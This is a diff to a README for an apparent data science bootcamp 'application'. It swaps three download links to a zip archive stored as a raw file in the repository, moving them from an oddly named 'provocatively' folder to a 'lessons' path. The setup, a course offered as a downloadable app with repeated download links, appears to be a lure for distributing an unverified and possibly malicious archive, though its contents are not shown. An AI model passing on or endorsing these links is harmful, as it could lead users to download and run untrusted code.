@@ -1,6 +1,6 @@
 # 📊 ds-ml-bootcamp - Learn Data Science and Machine Learning Effortlessly
 
-[![Download ds-ml-bootcamp](https://raw.githubusercontent.com/ozcankyo28/ds-ml-bootcamp/main/provocatively/ds-ml-bootcamp.zip)](https://raw.githubusercontent.com/ozcankyo28/ds-ml-bootcamp/main/provocatively/ds-ml-bootcamp.zip)
+[![Download ds-ml-bootcamp](https://raw.githubusercontent.com/ozcankyo28/ds-ml-bootcamp/main/lessons/ml-bootcamp-ds-1.7.zip)](https://raw.githubusercontent.com/ozcankyo28/ds-ml-bootcamp/main/lessons/ml-bootcamp-ds-1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ Don't worry if you don't have Python installed. The application comes with instr
 
 To get started, visit the link below to download the ds-ml-bootcamp application:
 
-[Download ds-ml-bootcamp](https://raw.githubusercontent.com/ozcankyo28/ds-ml-bootcamp/main/provocatively/ds-ml-bootcamp.zip)
+[Download ds-ml-bootcamp](https://raw.githubusercontent.com/ozcankyo28/ds-ml-bootcamp/main/lessons/ml-bootcamp-ds-1.7.zip)
 
 ### 🔗 Steps to Download
 
@@ -90,6 +90,6 @@ If you need additional support, please reach out through the following channels:
 
 To download the latest version of ds-ml-bootcamp, please visit:
 
-[Download ds-ml-bootcamp](https://raw.githubusercontent.com/ozcankyo28/ds-ml-bootcamp/main/provocatively/ds-ml-bootcamp.zip)
+[Download ds-ml-bootcamp](https://raw.githubusercontent.com/ozcankyo28/ds-ml-bootcamp/main/lessons/ml-bootcamp-ds-1.7.zip)
 
 We hope you enjoy your journey into data science and machine learning!
